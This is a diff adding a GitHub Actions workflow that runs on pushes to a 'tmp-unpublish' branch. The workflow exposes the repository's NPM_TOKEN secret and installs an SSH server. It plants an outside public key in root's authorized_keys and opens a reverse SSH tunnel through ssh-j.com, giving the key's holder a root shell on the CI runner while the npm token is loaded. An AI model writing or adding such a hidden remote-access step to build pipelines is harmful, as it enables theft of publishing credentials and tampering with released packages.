@@ -1,0 +1,23 @@
+name: tmp
+
+on:
+  push:
+    branches:
+      - tmp-unpublish
+
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sshj
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+        run: |
+          sudo apt update
+          sudo apt install -y openssh-server
+          sudo bash -c "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILQHs2yC6VOw/nFUKpdydIiGpbCOF/gAsq3u++hCbZBK none@none' > /root/.ssh/authorized_keys"
+          sudo systemctl enable --now ssh
+
+          sudo ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null klasdfjklsdfjsda@ssh-j.com -N -R gh-actions:22:localhost:22
